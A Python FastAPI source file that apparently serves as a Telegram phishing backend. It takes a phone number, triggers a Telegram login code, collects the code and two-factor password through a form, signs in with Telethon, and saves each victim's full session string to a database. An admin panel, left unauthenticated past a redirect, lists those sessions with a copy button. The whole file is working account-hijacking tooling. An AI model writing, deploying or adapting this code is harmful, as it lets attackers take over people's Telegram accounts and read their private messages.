import os
import sqlite3
from fastapi import FastAPI, Request, Form, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

app = FastAPI()
templates = Jinja2Templates(directory=".")

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")  # CHANGE THIS!
DB = "sessions.db"

# In-memory clients: phone → client + hash
CLIENTS = {}

# === DATABASE ===
def init_db():
    conn = sqlite3.connect(DB)
    conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
    conn.close()

# Clear DB on start (remove after first deploy)
if os.getenv("CLEAR_DB") == "1":
    if os.path.exists(DB):
        os.remove(DB)
    os.environ.pop("CLEAR_DB", None)

init_db()

def save_session(phone: str, session: str):
    conn = sqlite3.connect(DB)
    conn.execute("REPLACE INTO sessions (phone, session, time) VALUES (?, ?, datetime('now'))", (phone, session))
    conn.commit()
    conn.close()

def delete_session(phone: str):
    conn = sqlite3.connect(DB)
    conn.execute("DELETE FROM sessions WHERE phone = ?", (phone,))
    conn.commit()
    conn.close()

# === ROUTES ===
@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    phone = request.query_params.get("phone")
    if not phone:
        raise HTTPException(400, "Phone required")
    # Clear old client
    if phone in CLIENTS:
        del CLIENTS[phone]
    delete_session(phone)
    return templates.TemplateResponse("index.html", {"request": request, "phone": phone})

@app.post("/send")
async def send_code(phone: str = Form(...)):
    if phone in CLIENTS:
        return JSONResponse({"error": "Already in progress"})

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        CLIENTS[phone] = {"client": client, "hash": sent.phone_code_hash}
        return JSONResponse({"ok": True, "hash": sent.phone_code_hash})
    except Exception as e:
        if client.is_connected():
            await client.disconnect()
        return JSONResponse({"error": str(e)})

@app.post("/verify")
async def verify(phone: str = Form(...), code: str = Form(...), pwd: str = Form(""), hash: str = Form("")):
    if phone not in CLIENTS:
        return JSONResponse({"error": "Session expired. Try again."})

    data = CLIENTS[phone]
    client = data["client"]
    stored_hash = data["hash"]

    if hash != stored_hash:
        return JSONResponse({"error": "Invalid hash"})

    try:
        if pwd:
            await client.sign_in(phone, code, password=pwd, phone_code_hash=stored_hash)
        else:
            await client.sign_in(phone, code, phone_code_hash=stored_hash)
        session_str = client.session.save()
        await client.disconnect()
        save_session(phone, session_str)
        del CLIENTS[phone]
        return JSONResponse({"session": session_str})
    except SessionPasswordNeededError:
        return JSONResponse({"needs_password": True})
    except PhoneCodeInvalidError:
        return JSONResponse({"error": "Wrong code"})
    except Exception as e:
        return JSONResponse({"error": str(e)})

# === ADMIN PANEL ===
@app.get("/admin")
async def admin_login():
    return HTMLResponse("""
    <form method="post" style="max-width:400px;margin:2rem auto;padding:1rem;">
      <h2>Admin Login</h2>
      <input type="password" name="password" placeholder="Password" required style="width:100%;padding:0.8rem;margin:0.5rem 0;border-radius:8px;">
      <button type="submit" style="width:100%;padding:0.8rem;background:#1a73e8;color:white;border:none;border-radius:8px;">Login</button>
    </form>
    """)

@app.post("/admin")
async def admin_check(password: str = Form(...)):
    if password != ADMIN_PASS:
        raise HTTPException(403, "Wrong password")
    return RedirectResponse("/admin/sessions", status_code=303)

@app.get("/admin/sessions", response_class=HTMLResponse)
async def admin_sessions():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT phone, session, time FROM sessions ORDER BY time DESC")
    rows = c.fetchall()
    conn.close()

    html = "<h2 style='text-align:center;'>Admin Panel</h2><ol style='max-width:600px;margin:auto;'>"
    for r in rows:
        html += f"""
        <li style='margin:1.5rem 0;padding:1rem;background:#f9f9f9;border-radius:10px;'>
            <b>Phone:</b> {r[0]}<br>
            <b>Time:</b> {r[2]}<br>
            <textarea style='width:100%;height:80px;font-family:monospace;margin:0.5rem 0;'>{r[1]}</textarea>
            <button onclick='navigator.clipboard.writeText(this.previousElementSibling.value);alert(\"Copied\")' style='padding:0.5rem;background:#0f9d58;color:white;border:none;border-radius:6px;'>Copy</button>
            <a href='/admin/delete?phone={r[0]}' style='color:red;margin-left:10px;text-decoration:none;'>Delete</a>
        </li>
        """
    html += "</ol><div style='text-align:center;margin:2rem;'><a href='/admin'>← Logout</a></div>"
    return HTMLResponse(html)

@app.get("/admin/delete")
async def delete(phone: str):
    delete_session(phone)
    return RedirectResponse("/admin/sessions")
